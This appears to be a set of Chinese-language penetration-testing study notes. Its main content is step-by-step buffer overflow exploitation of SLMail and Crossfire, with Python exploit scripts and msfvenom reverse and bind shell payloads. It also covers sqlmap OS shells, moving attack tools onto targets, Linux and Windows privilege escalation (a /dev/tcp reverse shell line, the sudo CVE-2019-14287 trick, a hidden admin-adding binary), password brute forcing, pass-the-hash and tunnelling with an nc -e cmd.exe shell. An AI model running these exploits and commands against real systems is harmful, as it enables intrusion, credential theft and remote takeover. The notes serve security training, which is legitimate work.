sqlmap -u http://192.168.30.35/comment.php?id=738 --dbms=mysql --os-shell           执行系统命令
sqlmap -d "mssql://sa:sql123456@ip:1433/master" --os-shell                          知道数据库密码后提权成为交互式系统shell



# 社工

## setoolkit

132(输入需要克隆的网址)
傻瓜式工具,命令行运行后一直选就完事了


## httrack

获取帮助:
httrack --help

示例:
httrack http://www.xxx.com -O /tmp/xxx



# 缓冲区溢出

## 漏洞示例

```vuln.c
#include <stdio.h>
int main(int argc,char *argv[])
{
    char buffer[64];
    if (argc < 2)
    {
        printf("syntax error\r\n");
        printf("must supply at-least one argument\r\n")        //语法错误必须至少提供一个参数
        return(1);
    }

    strcpy(buffer,argv[1]);         //把参数1复制到buffer中
    return(0);
}

```

使用工具：ollydbg(需以管理员权限运行)

esp(栈顶指针),ebp(栈底指针),eip(cpu)
将vuln.c编译成vuln.exe,使用 ollydbg 打开,设置参数为80个A(80字节),找到主函数开始地址,F2添加断点,F9运行程序,会自动到主函数所在位置停止。F7进入主函数。
在复制参数的位置设置断点,使程序运行到该位置停止。F7进行单步调试,观察右下方的内存堆栈变化。F8直接完成复制操作。可以观察到目前的函数返回地址已被A填充,CPU执行到此处时,便会出错。


## 如何发现该漏洞

源码审计
逆向分析
fuzz(对每个输入点输入超多字节)


## 利用思路

fuzz找到溢出点和溢出字节数
控制eip,重定向执行
查找bad char
生成shell code


## olldbg

F2：设置断点
F8：单步步过,每按一次这个键执行一条反汇编窗口中的一条指令,遇到 CALL 等子程序不进入其代码
F7：单步步入,功能同单步步过(F8)类似,区别是遇到 CALL 等子程序时会进入其中,进入后首先会停留在子程序的第一条指令上
F4：运行到选定位置,作用就是直接运行到光标所在位置处暂停
CTR+F9：执行到返回,此命令在执行到一个 ret (返回指令)指令时暂停,常用于从系统领空返回到我们调试的程序领空
ALT+F9：执行到用户代码,可用于从系统领空快速返回到我们调试的程序领空


## 漏洞实例

### windows(32bit)

以SLMail为例(版本5.5.0)

```pop3-pass-fuzz.py
#!/usr/bin/python
# -*- encoding: utf-8 -*-
import socket

#创建一个缓冲区数组,同时递增它们

buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing PASS with %s bytes"%len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect(('192.168.30.35',110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
```

以管理员权限运行SLMail和Immunity Debugger
Attach-SLMail
更改设置:右击-Appearance-font(all)-OEM fixed font   下方右击-Hex-Hex/ASCII(16bytes)
点击上方开始按钮后,在kail机运行:    python pop3-pass-fuzz.py
debugger显示 access violation when executing [41414141]-use Shift+F7/F8/F9 to pass exception to program 时,记录下此时的字节数   观察EBP和EIP的值,已被A(41)填充
在ESP上右击Follow in Dump,跳到内存查看


关闭debugger,重启slmail服务
```slmail-pop3.py
#!/usr/bin/python
# -*- encoding: utf-8 -*-

import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = 'A' * 2700

try:
    print "\nSending evil buffer..."
    s.connect(('192.168.30.35',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```
打开Immunity Debugger   Attach-SLMail,开始
在kail机运行:   python slmail-pop3.py
出现提示信息后,此时EIP也被A填充


使用msf-pattern_create模块,生成2700个字节的字符串:    msf-pattern_create -l 2700
用生成的字符串去替换slmail-pop3.py脚本的buffer参数
重启slmail服务和debugger,  python slmail-pop3.py
读出EIP的填充值,去生成的字符串中检索:   msf-pattern_offset -q 39694438    [例:]   Exact match at offset 2606
将slmail-pop3.py的buffer替换成:     buffer = "A" * 2606 + "B" * 4 + "C" * (2700-2606-4)
重启slmail服务和debugger,  python slmail-pop3.py
可以观察到,EIP的值已被B(42)填充


通常shellcode包含350-400个字节
重启slmail服务和debugger,
将slmail-pop3.py的buffer替换成:     buffer = "A" * 2606 + "B" * 4 + "C" * (3500-2606-4)
python slmail-pop3.py   观察到EIP仍被B填充,对ESP进行Follow in Dump,发现其已被填充成C(43)
算出此时栈中能利用的最大字节数: 0xA2D0 - 0xA128 = 0x1A8 = 424


发送从0x00-0xff字符来找出bad char,通常情况下,0x00都是bad char
重启slmail服务和debugger,修改脚本如下
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A" * 2606 + "B" * 4 + badchars
```
python slmail-pop3.py, follow esp in dump
找出其中一个bad char之后,修改badchars变量,继续测试:     重启slmail服务和debugger,  python slmail-pop3.py, follow esp in dump  重复上述步骤,直到找出所有的bad chars


下载mona, https://github.com/corelan/mona  将mona.py拖放到"PyCommands"文件夹中(在Immunity Debugger应用程序文件夹中)。在c:\python27中安装Python 2.7.14(或更高版本的2.7.xx),从而覆盖与Immunity捆绑在一起的版本。尝试更新mona时需要这样做以避免TLS问题。确保正确安装32位版本的python。
!mona modules   查看所有的模块
其中Rebase表示重启后是否会改变地址,False即不改变;SafeSEH、ASLR、NXCompat这三项都是Windows相关的安全机制;OS Dll表示是否是OS自带的库；即前四列选False,最后一列选True
切换到上方的m模块,继续筛选出有执行权限的dll
依次对满足上述条件的dll查找是否存在所需指令(切换到e界面,双击进入):
右击-Search for-command-jmp esp
右击-Search for-Sequence of commands-push esp retn
下方显示没有任何内容(通常情况下会有)
调用msf中的模块,找该命令对应的十六进制数:
```
msf-nasm_shell
nasm > jmp esp
00000000 FFE4                       jmp esp
```
对每个找到的dll执行:    !mona find -s "\xff\xe4" -m xxx.dll
确定对应的模块:  C:\windows\system32\SLMFC.dll
点上方的e,会显示所有被slmail.exe加载的dll文件,找到SLMFC.dll后,双击,加载成功后,上方标题栏会变成[thread xxxxx,module SLMFC]
上方切换到k模块,在下方输入:     !mona find -s "\xff\xe4" -m slmfc.dll
在找到的结果中,筛选没有bad char的项
点击上方最右边蓝色的向右箭头-输入内存地址-跳到内存地址后-右击-copy to clipnoard-address(5F4A358F)
修改py脚本:     buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)
重启slmail服务和debugger,跳到(5F4A358F)内存处,F2设置断点
python slmail-pop3.py,可以观察到此时程序停在了(5F4A358F)处,右击follow esp in dump,查看栈中的数据
F7单步调试,进入jmp esp中,观察到程序执行的代码段,全是C


重启slmail服务和debugger,使用msfvenom生成shell code payload:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d"(找到的bad char) -e x86/shikata_ga_nai
会得到一串shell code: unsigned char buf[] = "xxxx..."
修改py脚本
```
shellcode = ("xxx...")

# \x90指的是nop,这里填写16个字节是为了容错,防止ESP寄存器起始的字节丢失而造成shellcode不能正常执行的情况

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16)
```
在jmp esp的内存地址处F2设置断点,python slmail-pop3.py,在断点处F7进行单步调试,把第八个nop处的值修改成int3(函数中断),然后F7继续执行,到循环处,观察内存中的shell code解码,在CLD处F2添加断点,观察全部解码后的内存空间
在kail机进行侦听:   nc -lvp 443     可以看到有回弹shell连接过来     exit

重启slmail服务和debugger,
nc -nvlp 443
python slmail-pop3.py
exit
此时 nc -v 192.168.30.5 110 发现拒绝连接,说明该服务已未响应



### linux(32bit)

查看内核版本:
uname -a
Linux kali 3.7-trunk-486 #1 Debian 3.7.2-0+kali8 i686 GNU/Linux

设置防火墙:
iptables -A INPUT -p TCP --destinatipon-port 13327 \! -d 127.0.0.1 -j DROP
iptables -A INPUT -p TCP --destinatipon-port 4444 \! -d 127.0.0.1 -j DROP

edb --run /usr/games/crossfire/bin/crossfire
run运行该程序

```crossfire-poc.py
#!/usr/bin/python
import socket

host = "127.0.0.1"

crash = "\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()
print "[*]Payload Sent !"
```
python crossfire-poc.py
观察到此时eip已被A(41)填充
修改py脚本:     crash = "\x41" * 4368 + "\x42" * 4 + "C" * 7
重启edb:        edb --run /usr/games/crossfire/bin/crossfire
python crossfire-poc.py     观察到eip已被B(42)填充
follow eax in dump  可以看到eax地址处的值为setup sound,复制eax的内存地址(0xb6ef0a0e),跳到该地址处,可以看到值(73 65 74 75 70 20 73 6f 75 6e 64) follow ebx in dump   没有任何结果
follow esp in dump  可以看到buffer结尾的一串C

在kali机运行:
```
ruby /usr/share/metasploit-framework/tools/nasm_shell.rb
nasm > add eax,12
00000000 83C00C             add eax,byte +0xc
nasm > jmp eax
00000000 FFE0               jmp eax
nasm > exit
```

修改py脚本:     crash = "\x41" * 4368 + "\x42" * 4 + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

edb-Plugins-OpcodeSearcher-Opcode Search-(ESP -> EIP)-(r-x)-Find-选择找到的第一个jmp esp,复制其地址(0x08134597)

查找bad char

修改py脚本:
ret = "\x97\x45\x13\x08"
crash = "\x41" * 4368 + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

edb-右击-Goto Address-0x08134597-双击设置断点-开始运行

生成shell code:
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" --platdorm linux -a x86 -e x86/shikata_ga_nai

修改py脚本:
```
shellcode = ("xxx")
crash = shellcode + "\x41" * (4368-xx) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
```

打开crossfire:
/usr/games/crossfire/bin/crossfire

netstat -antp | grep 4444       (没有任何信息,证明4444端口未开放)
python crossfire-poc.py
netstat -antp | grep 4444       (此时4444已开放侦听)
nc -nv 127.0.0.1 4444           (连接bind shell)



# 使用公开的exp

## 辨别exp

将下载下来的shellcode保存成payload.txt,在终端执行:
printf $(cat payload.txt |tr -d '\n')
将会将其解密后的结果显示在屏幕上


## 权威网站

https://www.securityfocus.com/vulnerabilities

https://www.exploit-db.com/


## 本地查找

ls -l /usr/share/exploitdb/
searchsploit slmail(漏洞/服务名)


## fixing exploits

### 示例1


```fix 643.c
cp /usr/share/exploitdb/platforms/windows/remote/{643.c,646.c} .

nano 643.c  使用msfvenom生成shellcode替换, msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -t c

gcc 643.c -o slmail-linux

file slmail-linux                                           (查看文件属性)

nc -nvlp 443                                                (在另一个终端运行)

./slmail-linux
```

### 示例2

```fix 646.c
apt-get install mingw32                                     (由于646.c是基于windows环境编写的,所以要下载mingw32)

nano 643.c  同样使用msfvenom生成shellcode替换, msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -t c

i586-mingw32msvc-gcc 646.c                                  (通常情况会报错,把报错信息粘贴到谷歌进行搜索)

i586-mingw32msvc-gcc 646.c -lws2_32 -o slmail-windows.exe   (重新编译)

file slmail-windows.exe                                     (查看文件属性)

nc -nvlp 443                                                (在另一个终端运行)

wine slmail-windows.exe 192.168.30.35
```



# 后渗透

## 文件传输

攻击主机：kali      目标机器:windows/linux

### tftp

基于udp,端口为69

攻击机起tftp:
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
chown -R nobody /tftp

目标机:
tftp -i kali-ip GET nc.exe


### ftp

攻击机:
apt-get install pure-ftpd
```setup-ftp
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd username -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
./setup-ftp(输入要设置的密码)
```ftp-commands
echo open kali-ip 21> ftp.txt
echo username>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```
把ftp-commands文件中的内容粘贴到目标机的远程shell上去运行

目标机上传文件(连接状态):
ftp> put target.exe(如果是windows且文件在其他盘,需使用绝对路径)

关闭ftp:
/etc/init.d/pure-ftpd stop

攻击机使用python起ftp:
apt-get install python-pyftpdlib
mkdir /ftp
cd /ftp/
python -m pyftpdlib -p 21
此时目标机连接的时候,用户名为anonymous,密码随意


### vbscript

```wget-vbs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo strFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
攻击机起http服务:
cp exploit.exe /var/www/
service apache2 start

在目标机执行wget-vbs中的命令,会生成wget.vbs
目标机执行:
dir wget.vbs
cscript wget.vbs http://kali-ip/exploit.exe (要下载的文件)exploit.exe(保存成的文件名)


### powershell

同样,攻击机起http服务
```powershell-download
echo $storageDir =$pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://kali-ip/exploit.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
在目标机执行powershell-download中的命令,会生成wget.ps1
目标机执行:
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1


## 权限提升

### linux

网页:   https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  https://www.rebootuser.com/?p=1623

/etc/issue 和 /etc/redhat-release都是系统安装时默认的发行版本信息,通常安装好系统后文件内容不会发生变化

lsb_release -a ：FSG(Free Standards Group)组织开发的LSB (Linux Standard Base)标准的一个命令,用来查看linux兼容性的发行版信息(手动升级系统内核,会使lsb_release -a和/etc/issue显示的发行版本号不同)

/proc/version 和 uname -a 显示的内容相同,显示linux内核版本号

去 https://www.exploit-db.com/ 找对应的溢出exp,下载到目标机

gcc exploit.c -o exploit    (编译成二进制文件)


找带suid的文件:
find / -perm -2 ! -type l -ls 2>/dev/null
筛选出其中所有人有rwx权限的文件,添加如下一句话:
bash -i >& /dev/tcp/kali-ip/port 0>&1

若/etc/passwd文件可修改:
openssl passwd -1   输入你想改成的密码,用得到的hash去替换root行的x
python -c 'import pty; pty.spawn("/bin/bash")'
然后su root,输入上一步改的密码


### windows

网页:   https://www.fuzzysecurity.com/tutorials/16.html     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
找本地提权的exp,例: ms11-080
如果目标机上没有安装python,使用pyinstaller把它编译成二进制文件(在windows环境下使用):
python pyinstaller.py --onefile ms11-080.py
生成的文件会在pyinstaller/ms11-080/dist 目录下
pyinstall可直接用pip安装:       pip install PyInstaller
网址:       https://pypi.org/project/PyInstaller/       http://www.pyinstaller.org/


CVE-2019-14287:
查找:
cat /etc/sudoers | grep "(\s*ALL\s*,\s*\!root\s*)"
cat /etc/sudoers | grep "(\s*ALL\s*,\s*\!#0\s*)"
利用:
sudo -u#-1 id -u
或者:
sudo -u#4294967295 id -u


添加开机启动项:
```useradd.c
#include <stdlib.h>
int main ()
{
    int i;
    i=system ("net localgroup adminstrators lowpriv /add");
    return 0;
}
```
i586-mingw32msvc-gcc useradd.c -o useradd.exe
将useradd.exe传到目标机上,用useradd.exe去替换everyone完成控制且以系统权限开机自启的exe,即可将用户lowpriv提升为管理员权限
查看一个程序的各个用户权限: icacls xxx.exe


### weak services

|windows                                                        |linux
|---------------------------------------------------------------|-------------------------
|proshow    c:\Program Files\ProShow Producer\scsiAccess.exe    |/etc/cron.daily/chkrootkit
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|                                                               |


## 密码攻击

kali自带字典:
ls -l /usr/share/wordlists/

linux root密码hash:
unshadow passwd shadow > unshadow.txt

### 字典生成

#### crunch

crunch <min> <max> [options]

 min    设定最小字符串长度（必选）
 max    设定最大字符串长度（必选）

|options                                    |说明
|-------------------------------------------|------
|-b                                         |指定文件输出的大小,避免字典文件过大
|-c                                         |指定文件输出的行数,即包含密码的个数
|-d                                         |限制相同元素出现的次数 例: -d 2@限制小写字母输出像aab和aac,aaa不会产生,因为这是连续3个字母,格式是数字+符号,数字是连续字母出现的次数,符号是限制字符串的字符
|-e                                         |定义停止字符,即到该字符串就停止生成
|-f                                         |调用库文件（/etc/share/crunch/charset.lst）
|-i                                         |改变输出格式,即aaa,aab -> aaa,baa
|-I                                         |通常与-t联合使用,表明该字符为实义字符
|-m                                         |通常与-p搭配
|-o                                         |将密码保存到指定文件
|-p                                         |指定元素以组合的方式进行
|-q                                         |读取密码文件,即读取pass.txt
|-r                                         |定义重某一字符串重新开始
|-s                                         |指定一个开始的字符,即从自己定义的密码xxxx开始
|-t                                         |指定密码输出的格式
|-u                                         |禁止打印百分比（必须为最后一个选项）
|-z                                         |压缩生成的字典文件,支持gzip,bzip2,lzma,7z

%      代表数字                              ^      代表特殊符号
@      代表小写字母                          ,     代表大写字母


#### cewl

语法：cewl <url> [options]

|options                                    |说明
|-------------------------------------------|---------------
|-h                                         |显示帮助
|-k                                         |保存下载文件
|-d <x>                                     |爬行深度,默认2
|-m                                         |最小长度,默认最小长度为3
|-o                                         |允许爬虫访问其他站点
|-w                                         |将输出结果写入到文件
|-u                                         |设置user agent
|-n                                         |不输出字典
|–with-numbers                              |允许单词中存在数字,跟字母一样
|-a                                         |包括元数据
|–meta_file file                            |输出元数据文件
|-e                                         |包括email地址
|–email_file <file>                         |输入邮件地址文件
|–meta-temp-dir <dir>                       |exiftool解析文件时使用的临时目录,默认是/temp
|-c                                         |显示发现的每个单词的数量
|-v                                         |verbose
|–debug                                     |提取调试信息
|–auth_type                                 |Digest或者basic认证
|–auth_user                                 |认证用户名
|–auth_pass                                 |认证密码
|–proxy_host                                |代理主机
|–proxy_port                                |代理端口,默认8080
|–proxy_username                            |代理用户名
|–proxy_password                            |代理密码


示例:   爬行 www.megacorpone.com 主页上的数据,并在得到字典的尾部加上两位随机数字,生成新字典
```
cewl www.megacorpone.com -m 6 -w /root/megacorp-cewl.txt
nano /etc/john/john.conf
$[0-9]$[0-9]
john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```


### 获取hash

fgdump: 需要管理员权限,会将各个用户的hash值保存成txt

wce(Windows Credentials Editor): 需要管理员权限,但获取的是明文密码


### 使用hash

#### 在线网站

https://crackstation.net
https://hashkiller.co.uk

#### john the ripper

john hashes.txt                                     使用john自带的字典破解
john --wordlist=password.txt hashes.txt             使用指定的密码字典
john生成字典,修改配置文件 /etc/john/john.conf ,具体参数详见:    https://www.openwall.com/john/doc/RULES.shtml

#### hashcat

网址: https://xz.aliyun.com/t/4008

|option                                             |说明
|---------------------------------------------------|--------------
|-a                                                 |指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
|-m                                                 |指定要破解的hash类型，如果不指定类型，则默认是MD5
|-o                                                 |指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中
|--force                                            |忽略破解过程中的警告信息,跑单条hash可能需要加上此选项
|--show                                             |显示已经破解的hash及该hash所对应的明文
|--increment                                        |启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程
|--increment-min                                    |密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用
|--increment-max                                    |密码最大长度,同上
|--outfile-format                                   |指定破解结果的输出格式id,默认是3
|--username                                         |忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到
|--remove                                           |删除已被破解成功的hash
|-r                                                 |使用自定义破解规则

示例:   hashcat64.exe -m 500 unshadow.txt rockyou.txt
建议在物理机里使用

#### passing the hash

passing the hash,中文一般翻译为hash传递攻击,在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值,在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。当攻击者获取了存储在计算机上的用户名和密码的hash值的时候,他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。

PTH套件每个工具都针对WIN下响应的EXE文件,如使用Pth-winexe可以借助哈希执行程序得到一个cmdshell:
export SMBHASH=xxxxxx...:xxxx...
pth-winexe -U administrator% //target-ip cmd
no password 需要替换成空的LM hash加密值: aad3b435b51404eeaad3b435b51404ee


### 在线密码攻击

#### medusa

|options                                            |说明
|---------------------------------------------------|------
|-h                                                 |目标IP
|-H                                                 |目标主机文件
|-u                                                 |用户名
|-U                                                 |用户名文件
|-p                                                 |密码
|-P                                                 |密码文件
|-C                                                 |组合条目文件
|-O                                                 |文件日志信息
|-e                                                 |n为尝试空密码,s为密码与用户名相同(n/s/ns)
|-M                                                 |模块执行名称
|-m                                                 |传递参数到模块
|-d                                                 |显示所有的模块名称
|-n                                                 |使用非默认端口
|-s                                                 |启用SSL
|-r                                                 |重试间隔时间,默认为3秒
|-t                                                 |设定线程数量
|-L                                                 |并行化,每个用户使用一个线程
|-f                                                 |在任何主机上找到第一个账号/密码后,停止破解
|-q                                                 |显示模块的使用信息
|-v                                                 |详细级别(0-6)
|-w                                                 |错误调试级别(0-10)
|-V                                                 |显示版本
|-Z                                                 |继续扫描上一次

示例:
medusa -h 192.168.31.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 20

破解MSSQL:
medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql

破解SSH:
medusa -h ip -M ssh -H host.txt -U user.txt -p password


#### ncrack

用法:   ncrack [Options] {target and service specification}

|options                                                |说明
|-------------------------------------------------------|-------------------
|-iX                                                    |从Nmap的-oX XML输出格式输入
|-iN                                                    |从Nmap的-oN正常输出格式输入
|-iL                                                    |从主机/网络列表中输入
|--exclude                                              |排除主机/网络
|--excludefile                                          |排除文件中的主机
|-p                                                     |服务将被应用于所有非标准的符号主机
|-m                                                     |选项将应用于此类型的所有服务
|-g                                                     |选项将应用于全局的每个服务
|cl                                                     |最小连接限制
|CL                                                     |最大连接限制
|at                                                     |身份验证尝试
|cd                                                     |连接延迟
|cr                                                     |连接重试
|to                                                     |超时
|-T                                                     |设定时间模板<0-5>（越快越快）
|--connection-limit                                     |总并发连接的阈值
|-U                                                     |用户名文件
|-P                                                     |密码文件
|--user                                                 |逗号分隔的用户名单
|--pass                                                 |逗号分隔的密码列表
|--passwords-first                                      |迭代每个用户名的密码列表,默认是相反的
|--pairwise                                             |成对选择用户名和密码
|-oN                                                    |以txt格式输出
|-oX                                                    |以XML格式输出
|-oA                                                    |一次输出两种主要格式
|-v                                                     |增加详细程度(>=2效果更好)
|-d                                                     |设置或增加调试级别(0-10)
|--nsock-trace <level>                                  |设置nsock跟踪级别(0-10)
|--log-errors                                           |将错误/警告记录到txt文件中
|--append-output                                        |附加到指定的输出文件而不是覆盖
|--resume                                               |继续先前保存的会话(需指定之前保存的文件)
|--save                                                 |保存具有特定文件名的恢复文件
|-f                                                     |在找到一个密码后退出服务
|-6                                                     |启用IPv6破解
|-sL                                                    |只列出主机和服务
|--datadir <dirname>                                    |指定自定义Ncrack数据文件位置
|--proxy <type: // proxy: port>                         |通过socks4,4a,http进行连接
|-V                                                     |版本查看号
|-h                                                     |查看帮助界面


示例:
ncrack -v -f --user administrator -P password-file.txt rdp://192.168.31.233,CL=1


#### hydra

|options                                                |说明
|-------------------------------------------------------|----------
|-l                                                     |指定破解的用户名称
|-L                                                     |从文件中加载用户名进行破解
|-p                                                     |指定密码破解
|-P                                                     |指定密码字典
|-e                                                     |可选选项,n:空密码试探,s:使用指定用户和密码试探(n/s/ns)
|-C                                                     |使用冒号分割格式,例如"登录名:密码"来代替-L/-P参数
|-t                                                     |同时运行的连接的线程数,每一台主机默认为16
|-M                                                     |指定服务器目标列表文件一行一条
|-w                                                     |设置最大超时的时间,单位秒,默认是30s
|-o                                                     |指定结果输出文件
|-f                                                     |在使用-M参数以后,找到第一对登录名或者密码的时候中止破解
|-v/-V                                                  |显示详细过程
|-R                                                     |继续从上一次进度接着破解
|-S                                                     |采用SSL链接
|-s                                                     |指定端口
|-U                                                     |服务模块使用细节
|-h                                                     |查看帮助

server                                                  目标服务器名称或者IP(使用这个或-M选项)
service                                                 指定服务名,支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
OPT                                                     一些服务模块支持额外的输入(-U用于模块的帮助)


示例:
hydra -l admin -P password-file.txt -v 192.168.31.219 ftp


## 端口转发与隧道

### rinet

示例:   172.16.40.20(win)要远程连接到67.23.72.100(win)的3389端口,以208.88.127.99(kali)做中转

```bash
nano /etc/rinetd.conf(添加一行)
208.88.127.99 80 67.23.72.100 3389
/etc/init.d/rinetd restart
```
然后172.16.40.20(mstsc)连接208.88.127.99:80即可


### ssh隧道

示例:
208.88.127.99(kali):
nc -lvp 443

172.16.40.20(win):
nc64.exe -nv 208.88.127.99 443 -e cmd.exe
plink.exe -l root -pw ubersecretpassword 208.88.127.99 -R 3390:127.0.0.1:3389

208.88.127.99(kali):
rdesktop 127.0.0.1:3390


### proxychains

示例:
kali机:
ssh -D 8080 root@admin.megacorpone.com(172.16.40.10)
在8080端口起一个socks代理
nano /etc/proxychains.conf
socks4 127.0.0.1 8080
proxychains nmap -p 3389 -sT -Pn 172.16.40.18-22 --open
proxychains rdesktop 172.16.40.20



# msfvenom

## 简介

msfvenom模块通常是Metasploit最有用的功能(对于初学者而言被低估了)。可以使用此模块创建多个有效负载,它可以在几乎任何情况下为您提供可以成为Shell的东西。对于每个有效负载,您都可以进入msfconsole并选择exploit / multi / handler。为使用的相关有效负载运行“set payload”,并配置所有必要的选项(lhost,lport等)。执行并等待有效负载运行。对于下面的示例,它很容易说明,但是lhost应该使用您的IP地址(如果在内网进行攻击,则为LAN IP；如果通过Internet进行攻击,则为WAN IP),而lport应该是您希望进行连接的端口。

## 用法

### 选项

|options                                                        |说明
|---------------------------------------------------------------|--------------------------------
|-p                                                             |指定需要使用的payload(攻击荷载)
